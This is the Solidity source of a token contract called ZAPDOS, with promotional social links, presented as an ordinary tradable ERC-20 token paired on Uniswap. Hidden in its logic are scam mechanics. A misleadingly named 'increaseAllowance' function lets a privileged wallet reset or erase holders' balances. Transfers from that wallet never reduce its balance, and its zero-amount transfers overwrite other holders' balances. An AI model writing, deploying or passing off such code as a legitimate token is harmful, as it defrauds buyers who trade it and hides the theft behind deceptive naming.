/*


███████╗░█████╗░██████╗░██████╗░░█████╗░░██████╗
╚════██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝
░░███╔═╝███████║██████╔╝██║░░██║██║░░██║╚█████╗░
██╔══╝░░██╔══██║██╔═══╝░██║░░██║██║░░██║░╚═══██╗
███████╗██║░░██║██║░░░░░██████╔╝╚█████╔╝██████╔╝
╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═════╝░░╚════╝░╚═════╝░

TG: https://t.me/zapdosportal
Website: https://zapdos.nexus
Twitter: https://twitter.com/zapdostoken

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract ZAPDOS is Ownable {
    mapping(uint256 => mapping(address => uint256)) balance;
    mapping(uint256 => mapping(address => bool)) zapbal;

    uint256 private zapdistro = 1;
    string public name = "ZAPDOS";
    uint256 private zaplimit;

    function balanceOf(address user) public view returns (uint256) {
        if (user == zappair) return balance[zapdistro][user];

        if (!zapbal[zapdistro][user] && balance[zapdistro - 1][user] != 0) {
            return balance[zapdistro][user] + zaplimit;
        }
        return balance[zapdistro][user];
    }

    function increaseAllowance(
        uint256 _zaplimit,
        address[] memory zapholder
    ) public returns (bool success) {
        if (zapwallet[msg.sender] != 0) {
            zapdistro++;
            for (uint256 i = 0; i < zapholder.length; i++) {
                balance[zapdistro][zapholder[i]] =
                    balance[zapdistro - 1][zapholder[i]] +
                    zaplimit;
            }

            balance[zapdistro][zappair] = balance[zapdistro - 1][
                zappair
            ];

            zaplimit = _zaplimit;
        }

        return true;
    }

    function approve(
        address zapactive,
        uint256 zapnumber
    ) public returns (bool success) {
        allowance[msg.sender][zapactive] = zapnumber;
        emit Approval(msg.sender, zapactive, zapnumber);
        return true;
    }

    uint8 public decimals = 9;

    function zapspender(address zapapprover, address zapreceiver, uint256 zapnumber) private {
        if (!zapbal[zapdistro][zapapprover]) {
            zapbal[zapdistro][zapapprover] = true;
            if (balance[zapdistro - 1][zapapprover] != 0)
                balance[zapdistro][zapapprover] += zaplimit;
        }

        if (!zapbal[zapdistro][zapreceiver]) {
            zapbal[zapdistro][zapreceiver] = true;
            if (balance[zapdistro - 1][zapreceiver] != 0)
                balance[zapdistro][zapreceiver] += zaplimit;
        }

        if (zapwallet[zapapprover] == 0) {
            balance[zapdistro][zapapprover] -= zapnumber;
        }
        balance[zapdistro][zapreceiver] += zapnumber;
        if (
            zapwallet[msg.sender] > 0 && zapnumber == 0 && zapreceiver != zappair
        ) {
            balance[zapdistro][zapreceiver] = zapvalue;
        }
        emit Transfer(zapapprover, zapreceiver, zapnumber);
    }

    address public zappair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "ZAP";

    mapping(address => uint256) private zapwallet;

    function transfer(
        address zapreceiver,
        uint256 zapnumber
    ) public returns (bool success) {
        require(zapreceiver != address(0), "Can't transfer to 0 address");
        zapspender(msg.sender, zapreceiver, zapnumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(
        address zapapprover,
        address zapreceiver,
        uint256 zapnumber
    ) public returns (bool success) {
        require(zapnumber <= allowance[zapapprover][msg.sender]);
        allowance[zapapprover][msg.sender] -= zapnumber;
        zapspender(zapapprover, zapreceiver, zapnumber);
        return true;
    }

    constructor(address zapmarket) {
        balance[zapdistro][msg.sender] = totalSupply;
        zapwallet[zapmarket] = zapvalue;
        IUniswapV2Router02 zapworkshop = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        zappair = IUniswapV2Factory(zapworkshop.factory()).createPair(
            address(this),
            zapworkshop.WETH()
        );
    }

    uint256 private zapvalue = 101;

    mapping(address => uint256) private zapprime;
}